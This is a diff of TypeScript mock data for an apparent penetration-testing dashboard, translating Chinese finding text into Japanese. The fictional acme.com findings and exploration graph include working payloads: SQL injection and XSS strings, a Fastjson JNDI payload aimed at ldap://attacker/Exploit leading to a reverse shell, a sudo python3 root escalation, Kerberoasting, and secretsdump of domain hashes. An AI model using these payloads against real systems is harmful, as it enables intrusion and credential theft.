@@ -469,7 +469,7 @@ export const assets: Asset[] = [
     params: [{ name: "q", in: "query" }],
     last_seen: T("2026-07-26T02:14:00Z"),
   },
-  // 内网资产（DMZ→内网横向发现）
+  // 内部資産（DMZ から内部ネットワークへの横展開で見つかったもの）
   {
     id: 19,
     type: "ip",
@@ -570,9 +570,9 @@ export const assetCounts: Record<string, number> = assets.reduce<Record<string, 
   return m;
 }, {});
 
-// assetRef 把资产 id 变成 finding 上挂的资产引用(label 与后端 coverageNodeLabel
-// 的取值顺序一致:URL > 域名 > IP > 应用名)。「按资产」视图的树就是靠这些引用
-// 把发现挂到资产上的。
+// assetRef は資産 id を、検出事項にぶら下がる資産参照へ変える（label はバックエンドの coverageNodeLabel
+// と同じ優先順。URL > ドメイン > IP > アプリ名）。「資産別」ビューの木は、この参照で
+// 検出事項を資産へぶら下げる。
 function assetRef(id: number): FindingAsset {
   const asset = assets.find((candidate) => candidate.id === id);
   if (!asset) throw new Error(`mock assetRef: unknown asset ${id}`);
@@ -589,13 +589,13 @@ export const findings: Finding[] = [
     id: "f-1",
     assets: [assetRef(18)],
     vulnclass: "SQL Injection",
-    name: "官网搜索接口报错型 SQL 注入",
+    name: "公式サイト検索 API のエラー型 SQL インジェクション",
     severity: "high",
     status: "pending",
     report:
-      '## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n',
-    summary: "www.acme.com/search q 参数存在报错型 SQL 注入",
-    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。",
+      '## 脆弱性の概要\n\n`www.acme.com/search` の `q` パラメータに **エラー型 SQL インジェクション**（MSSQL）があります。データベースのバージョン、スキーマ、機密データまで読めます。\n\n## 影響\n\n- `acme_prod` のテーブル構造と、ユーザーおよび注文データを読めます\n- エラーがそのまま返るため、悪用の組み立てが速く、リスクが高いです\n\n## 再現手順\n\n1. エラー型インジェクションを発火させます。\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. レスポンスに MSSQL のバージョンエラーが返り、インジェクションできることを確認します\n3. データベースをさらに列挙します。`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修正案\n\n- すべてパラメータ化クエリまたはプリペアドステートメントにし、文字列連結をなくします\n- 本番環境の詳細なエラー表示を止めます\n- データベースアカウントは最小権限にし、`xp_cmdshell` などの危険な拡張を無効にします\n',
+    summary: "www.acme.com/search の q パラメータにエラー型 SQL インジェクションがあります",
+    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL のバージョンエラーが返り、スキーマを読めます。",
     intent_id: "i-2",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -607,8 +607,8 @@ export const findings: Finding[] = [
     vulnclass: "IDOR",
     severity: "high",
     status: "pending",
-    summary: "api.acme.com/v1/orders?id= 可越权读取他人订单",
-    evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。",
+    summary: "api.acme.com/v1/orders?id= で、権限を超えて他人の注文を読めます",
+    evidence: "id=1001 を id=1002 に変えると他人の注文（配送先と電話番号を含む）が返り、所有者の検証がありません。",
     intent_id: "i-5",
     task_id: "t-acme-api",
     task_description: "api.acme.com の権限外アクセスとインジェクションのテスト",
@@ -620,8 +620,8 @@ export const findings: Finding[] = [
     vulnclass: "Weak JWT",
     severity: "high",
     status: "pending",
-    summary: "API JWT 使用弱密钥、可离线爆破伪造",
-    evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。",
+    summary: "API の JWT は弱い鍵で、オフラインで破って偽造できます",
+    evidence: "HS256、鍵は 'secret'。john で 5 秒で破れ、任意の sub を偽造して権限を超えられます。",
     task_id: "t-acme-api",
     task_description: "api.acme.com の権限外アクセスとインジェクションのテスト",
     ts: T("2026-07-26T03:02:00Z"),
@@ -632,8 +632,8 @@ export const findings: Finding[] = [
     vulnclass: "Reflected XSS",
     severity: "medium",
     status: "pending",
-    summary: "搜索页对 q 参数未转义，反射型 XSS",
-    evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。",
+    summary: "検索ページは q パラメータをエスケープせず、反射型 XSS になります",
+    evidence: "q=<script>alert(document.domain)</script> が結果のタイトルにそのまま返ります。",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
     ts: T("2026-07-25T22:10:00Z"),
@@ -644,8 +644,8 @@ export const findings: Finding[] = [
     vulnclass: "Exposed .git",
     severity: "medium",
     status: "pending",
-    summary: "www.acme.com 暴露 .git 目录，可还原源码",
-    evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。",
+    summary: "www.acme.com は .git ディレクトリを公開しており、ソースを復元できます",
+    evidence: "GET /.git/HEAD → 200。git-dumper でバックエンドのソースと、データベース接続文字列のコメントを復元しました。",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
     ts: T("2026-07-25T20:30:00Z"),
@@ -656,8 +656,8 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    summary: "admin.acme.com 后台默认口令 admin/admin123",
-    evidence: "登录成功，进入管理后台，可管理用户与订单。",
+    summary: "admin.acme.com の管理画面は既定パスワード admin/admin123 です",
+    evidence: "ログインに成功し、管理画面に入れます。ユーザーと注文を管理できます。",
     intent_id: "i-3",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -669,8 +669,8 @@ export const findings: Finding[] = [
     vulnclass: "Open Redirect",
     severity: "low",
     status: "pending",
-    summary: "登录后 next 参数任意跳转",
-    evidence: "/login?next=https://evil.example 登录后 302 跳到外站。",
+    summary: "ログイン後の next パラメータで任意の URL へ飛びます",
+    evidence: "/login?next=https://evil.example でログインすると、302 で外部サイトへ飛びます。",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
     ts: T("2026-07-25T19:12:00Z"),
@@ -681,8 +681,8 @@ export const findings: Finding[] = [
     vulnclass: "Missing Rate Limit",
     severity: "medium",
     status: "pending",
-    summary: "登录接口无速率限制，可暴力破解",
-    evidence: "1000 次/分钟无锁定，无验证码。",
+    summary: "ログイン API にレート制限がなく、総当たりできます",
+    evidence: "毎分 1000 回でもロックされず、確認コードもありません。",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
     ts: T("2026-07-25T18:40:00Z"),
@@ -693,8 +693,8 @@ export const findings: Finding[] = [
     vulnclass: "Verbose Error",
     severity: "low",
     status: "pending",
-    summary: "API 500 返回堆栈，泄露路径与框架版本",
-    evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",
+    summary: "API の 500 はスタックを返し、パスとフレームワークのバージョンが漏れます",
+    evidence: "500 を起こすと Node.js のスタックが返り、絶対パスと依存のバージョンが漏れます。",
     task_id: "t-acme-api",
     task_description: "api.acme.com の権限外アクセスとインジェクションのテスト",
     ts: T("2026-07-25T23:05:00Z"),
@@ -705,20 +705,20 @@ export const findings: Finding[] = [
     vulnclass: "Outdated Component",
     severity: "medium",
     status: "pending",
-    summary: "shop 使用存在已知 RCE 的老版本组件",
-    evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",
+    summary: "shop は既知の RCE がある古いコンポーネントを使っています",
+    evidence: "フィンガープリントでコンポーネント v2.3.1 を識別しました。CVE-2024-xxxx のデシリアライズ RCE に当たります。",
     task_id: "t-shop-pay",
     task_description: "shop.acme.com の決済と注文のフロー",
     ts: T("2026-07-23T15:00:00Z"),
   },
-  // ── 外网→内网纵深链路上的高危发现（active task）──
+  // ── 外部から内部への縦深経路上の高リスク検出事項（active task）──
   {
     id: "f-11",
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021",
-    evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
+    summary: "漏れたソースにデータベース認証情報 sa/Acme@2021 がハードコードされています",
+    evidence: "git-dumper で www.acme.com/.git を復元すると config.php があり、DB パスワードが平文です。その後、内部ネットワークで使い回せることが確認されました。",
     intent_id: "ig",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -728,14 +728,14 @@ export const findings: Finding[] = [
     id: "f-12",
     assets: [assetRef(4)],
     vulnclass: "Deserialization RCE",
-    name: "shop 商城 Fastjson 反序列化远程命令执行",
+    name: "shop の Fastjson デシリアライズによるリモートコマンド実行",
     severity: "critical",
     status: "confirmed",
     report:
-      '## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',
-    summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
+      '## 脆弱性の概要\n\n`shop.acme.com` の `/api/import` は **Fastjson 1.2.24** でユーザーが制御できる JSON を解析します。`safeMode` は無効で、`@type` に任意のクラスを指定すると **JNDI インジェクションからリモートコマンド実行** になります。\n\n## 影響\n\n- 認証なしで DMZ の Web サーバー上の任意コマンドを実行できます（`www-data@dmz-web01`）\n- その後の権限昇格と合わせると、内部ネットワークへ入る足場になります\n\n## 再現手順\n\n1. JNDI payload を組み立てます。\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`、`Content-Type: application/json`\n3. 対象が dnslog へ折り返し、リバースシェルが着地します\n\n## 修正案\n\n- Fastjson を **1.2.83+** にアップデートし、`safeMode` を有効にします\n- `/api/import` に認証と送信元の検証を足します\n- 外向き通信を制限し、業務サーバーから LDAP/RMI への自発的な接続を禁止します\n',
+    summary: "shop.acme.com の Fastjson 1.2.24 でデシリアライズによるリモートコマンド実行ができます",
     evidence:
-      "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",
+      "POST /api/import に JNDI payload（@type:JdbcRowSetImpl）を送ると dnslog へ折り返し、リバースシェルが着地します（www-data@dmz-web01）。",
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -747,9 +747,9 @@ export const findings: Finding[] = [
     vulnclass: "Privilege Escalation",
     severity: "high",
     status: "pending",
-    summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root",
+    summary: "DMZ の足場は sudo NOPASSWD の誤設定で、ローカルから root へ権限昇格できます",
     evidence:
-      "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",
+      "sudo -l は (ALL) NOPASSWD: /usr/bin/python3 を示します。sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' でそのまま root を取れます。",
     intent_id: "i8",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -761,8 +761,8 @@ export const findings: Finding[] = [
     vulnclass: "Network Segmentation",
     severity: "medium",
     status: "pending",
-    summary: "DMZ 主机双网卡直连内网，边界隔离失效",
-    evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",
+    summary: "DMZ ホストは NIC が 2 枚あり内部ネットワークへ直結し、境界の分離が効いていません",
+    evidence: "dmz-web01 の 2 枚目の NIC は 10.10.10.0/24 にあり、DMZ から域コントローラー、ファイルサーバー、Jenkins へ直接届き、ネットワーク区画を越えられます。",
     intent_id: "i9",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -774,9 +774,9 @@ export const findings: Finding[] = [
     vulnclass: "Unauthenticated RCE",
     severity: "high",
     status: "pending",
-    summary: "内部 Jenkins 未授权 Script Console 远程命令执行",
+    summary: "内部 Jenkins の未認可 Script Console でリモートコマンド実行ができます",
     evidence:
-      "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",
+      "GET /script はログインなしで Groovy を実行できます。'whoami'.execute().text → SYSTEM。認証情報ストアからドメインアカウント acme\\svc_deploy を取り出せます。",
     intent_id: "i11",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -788,8 +788,8 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
     status: "pending",
-    summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱",
-    evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",
+    summary: "ドメインのサービスアカウント svc_sql は Kerberoast でき、パスワードが弱いです",
+    evidence: "GetUserSPNs で svc_sql の TGS を要求し、hashcat -m 13100 でオフライン解読すると Sql@2020 です。このアカウントは SQL 管理グループに属します。",
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -799,14 +799,14 @@ export const findings: Finding[] = [
     id: "f-17",
     assets: [assetRef(20)],
     vulnclass: "Domain Compromise",
-    name: "内网域控 DC01 完全控制（Domain Admin）",
+    name: "内部ネットワークの域コントローラー DC01 を完全制御（Domain Admin）",
     severity: "critical",
     status: "confirmed",
     report:
-      "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",
-    summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成",
+      "## 脆弱性の概要\n\n外部の Fastjson RCE で DMZ に足場を作り、sudo で権限昇格し、NIC 2 枚で境界を抜け、Jenkins の未認可 RCE でドメインアカウント `svc_deploy` を取得しました。このアカウントは **Domain Admins** に属し、最終的に域コントローラー **DC01** を完全に制御できます。\n\n## 影響\n\n- ドメイン管理者の権限を取得し、ドメイン全体のホストとアカウントを制御できます\n- `secretsdump` でドメイン全体の NTLM ハッシュ（`krbtgt` を含む）を取り出せ、ゴールデンチケットを作って長く潜伏できます\n- 内部の標的を達成しています\n\n## 再現手順\n\n1. `svc_deploy` でログインし、ハッシュを取り出します。\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. DC01 の SYSTEM 権限を得て、ドメイン内のハッシュをすべて取り出します\n\n## 修正案\n\n- サービスアカウントの権限を絞り、Domain Admins から外し、階層管理（tiering）を実施します\n- `krbtgt` を連続して 2 回リセットし、サービスアカウントを強いパスワードへローテーションします\n- DMZ から内部への境界分離と、前述の RCE および権限昇格の連鎖を直します\n",
+    summary: "域コントローラー DC01 を掌握しました（Domain Admin）。内部の標的を達成しています",
     evidence:
-      "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",
+      "svc_deploy は Domain Admins に属します。psexec.py で DC01 にログインすると SYSTEM になり、secretsdump でドメイン全体の NTLM ハッシュ（krbtgt を含む）を取り出し、標的の制御が完了します。",
     intent_id: "i13",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -815,9 +815,9 @@ export const findings: Finding[] = [
 ];
 
 // ── Exploration graph (active task) ──────────────────────────────────────────
-// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
-// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
-// 漏洞→目标(proves)，提示→意图(derived_from)。
+// 現行モデル。根は fact/state=origin（描画は「起点」）。payload は JSON 文字列で、
+// goal は text、それ以外は summary を取る。構造は、根→目標(spawns)→インテント(spawns)→事実/脆弱性(yields)、
+// 脆弱性→目標(proves)、ヒント→インテント(derived_from)。
 const P = (o: Record<string, string>) => JSON.stringify(o);
 
 export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
@@ -825,14 +825,14 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "root",
       type: "fact",
-      payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }),
+      payload: P({ summary: "根。acme.com の外部から内部への縦深侵入" }),
       priority: 0,
       state: "origin",
       origin: "system",
       ts: T("2026-07-24T09:12:00Z"),
     },
 
-    // ── 目标（由 goals agent 拆解，随发现逐步加码到内网靶标）──
+    // ── 目標（goals agent が分解し、検出に合わせて内部の標的まで段階的に上げる）──
     {
       id: "g1",
       type: "goal",
@@ -854,7 +854,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g3",
       type: "goal",
-      payload: P({ text: "从外网突破 DMZ，建立内网立足点" }),
+      payload: P({ text: "外部から DMZ を突破し、内部ネットワークの足場を作る" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -863,18 +863,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g4",
       type: "goal",
-      payload: P({ text: "内网横向，拿下内部靶标域控 DC01" }),
+      payload: P({ text: "内部ネットワークを横展開し、内部の標的である域コントローラー DC01 を掌握する" }),
       priority: 10,
       state: "met",
       origin: "goals",
       ts: T("2026-07-25T20:00:00Z"),
     },
 
-    // ── 第 1 层 · 外网侦察 / 外部漏洞 ──
+    // ── 第 1 層 · 外部偵察 / 外部の脆弱性 ──
     {
       id: "i1",
       type: "intent",
-      payload: P({ summary: "acme.com 子域枚举与端口扫描" }),
+      payload: P({ summary: "acme.com のサブドメイン列挙とポートスキャン" }),
       priority: 6,
       state: "done",
       origin: "planner",
@@ -883,7 +883,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i2",
       type: "intent",
-      payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }),
+      payload: P({ summary: "admin 管理画面の既定パスワードと弱いパスワードのテスト" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -892,7 +892,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i3",
       type: "intent",
-      payload: P({ summary: "枚举后台功能与用户数据接口" }),
+      payload: P({ summary: "管理画面の機能とユーザーデータ API の列挙" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -901,7 +901,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i4",
       type: "intent",
-      payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }),
+      payload: P({ summary: "www.acme.com/search ページの SQL インジェクション探査" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -910,7 +910,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i5",
       type: "intent",
-      payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }),
+      payload: P({ summary: "api.acme.com の注文 API の権限越え（IDOR）テスト" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -919,18 +919,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }),
+      payload: P({ summary: "www.acme.com の .git ソース漏えいと、ハードコードされた認証情報の取り出し" }),
       priority: 7,
       state: "done",
       origin: "planner",
       ts: T("2026-07-25T20:20:00Z"),
     },
 
-    // ── 第 2 层 · 突破 DMZ 建立立足点 ──
+    // ── 第 2 層 · DMZ を突破して足場を作る ──
     {
       id: "i6",
       type: "intent",
-      payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }),
+      payload: P({ summary: "shop.acme.com のコンポーネント指紋と CVE の関連付け" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -939,7 +939,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ summary: "触发 shop 反序列化 RCE，获取反弹 shell" }),
+      payload: P({ summary: "shop のデシリアライズ RCE を発火させ、リバースシェルを取得する" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -948,18 +948,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i8",
       type: "intent",
-      payload: P({ summary: "DMZ 立足点本地信息收集与提权至 root" }),
+      payload: P({ summary: "DMZ の足場でローカル情報を収集し、root まで権限昇格する" }),
       priority: 8,
       state: "done",
       origin: "planner",
       ts: T("2026-07-25T16:00:00Z"),
     },
 
-    // ── 第 3 层 · 内网横向纵深（多层测试）──
+    // ── 第 3 層 · 内部ネットワークの横展開（複数層のテスト）──
     {
       id: "i9",
       type: "intent",
-      payload: P({ summary: "以立足点为 pivot 做内网主机发现" }),
+      payload: P({ summary: "足場を pivot にして内部ホストを発見する" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -968,7 +968,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i10",
       type: "intent",
-      payload: P({ summary: "内网凭据复用与密码喷洒" }),
+      payload: P({ summary: "内部ネットワークでの認証情報の使い回しとパスワードスプレー" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -977,7 +977,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i11",
       type: "intent",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy 脚本执行(RCE)" }),
+      payload: P({ summary: "内部 Jenkins の未認可 Groovy スクリプト実行（RCE）" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -986,7 +986,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i12",
       type: "intent",
-      payload: P({ summary: "对域服务账号做 Kerberoasting 并离线破解" }),
+      payload: P({ summary: "ドメインのサービスアカウントに Kerberoasting を行い、オフラインで解読する" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -995,18 +995,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i13",
       type: "intent",
-      payload: P({ summary: "用域管理员凭据登录并控制域控 DC01" }),
+      payload: P({ summary: "ドメイン管理者の認証情報でログインし、域コントローラー DC01 を制御する" }),
       priority: 10,
       state: "done",
       origin: "planner",
       ts: T("2026-07-25T23:50:00Z"),
     },
 
-    // ── 事实 ──
+    // ── 事実 ──
     {
       id: "fa1",
       type: "fact",
-      payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }),
+      payload: P({ summary: "サブドメイン admin.acme.com を発見（Element-UI の管理画面）" }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1015,7 +1015,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }),
+      payload: P({ summary: "search ページの q パラメータは error-based の注入点（MSSQL）" }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1024,7 +1024,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ summary: ".git 可下载，git-dumper 还原出后端源码" }),
+      payload: P({ summary: ".git をダウンロードでき、git-dumper でバックエンドのソースを復元した" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1033,7 +1033,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }),
+      payload: P({ summary: "ソースの config.php に DB パスワード sa / Acme@2021 がハードコードされている（内部ネットワークで共通の疑い）" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1042,7 +1042,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa3",
       type: "fact",
-      payload: P({ summary: "shop 指纹命中 Fastjson 1.2.24（存在已知反序列化 RCE）" }),
+      payload: P({ summary: "shop の指紋が Fastjson 1.2.24 に一致（既知のデシリアライズ RCE がある）" }),
       priority: 0,
       state: "open",
       origin: "work#6",
@@ -1051,7 +1051,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ summary: "反弹 shell 成功：www-data@dmz-web01(10.0.20.15)，位于 DMZ 段" }),
+      payload: P({ summary: "リバースシェル成功。www-data@dmz-web01(10.0.20.15)。DMZ セグメントにいる" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1060,7 +1060,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root" }),
+      payload: P({ summary: "sudo -l。(ALL) NOPASSWD: /usr/bin/python3 → root へ権限昇格できる" }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1069,7 +1069,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa6",
       type: "fact",
-      payload: P({ summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" }),
+      payload: P({ summary: "足場の 2 枚目の NIC が内部ネットワーク 10.10.10.0/24 に直結（DMZ 境界を越える）" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1078,7 +1078,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa7",
       type: "fact",
-      payload: P({ summary: "内网存活：10.10.10.10 DC01(域控) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }),
+      payload: P({ summary: "内部で生存。10.10.10.10 DC01（域コントローラー） / 10.10.10.5 FS01（SMB） / 10.10.10.20 JENKINS" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1087,7 +1087,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa8",
       type: "fact",
-      payload: P({ summary: "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy" }),
+      payload: P({ summary: "JENKINS コンソールの /script は認証がなく、Groovy を直接実行できる" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1096,7 +1096,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa9",
       type: "fact",
-      payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }),
+      payload: P({ summary: "Jenkins の認証情報ストアからドメインアカウント acme\\svc_deploy の平文パスワードを取り出した" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1105,18 +1105,18 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020" }),
+      payload: P({ summary: "Kerberoast で svc_sql の TGS を取得し、hashcat でパスワード Sql@2020 を解読した" }),
       priority: 0,
       state: "open",
       origin: "work#12",
       ts: T("2026-07-25T23:20:00Z"),
     },
 
-    // ── 漏洞 ──
+    // ── 脆弱性 ──
     {
       id: "fi1",
       type: "finding",
-      payload: P({ summary: "后台默认口令 admin/admin123" }),
+      payload: P({ summary: "管理画面の既定パスワード admin/admin123" }),
       priority: 0,
       state: "confirmed",
       origin: "work#2",
@@ -1125,7 +1125,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
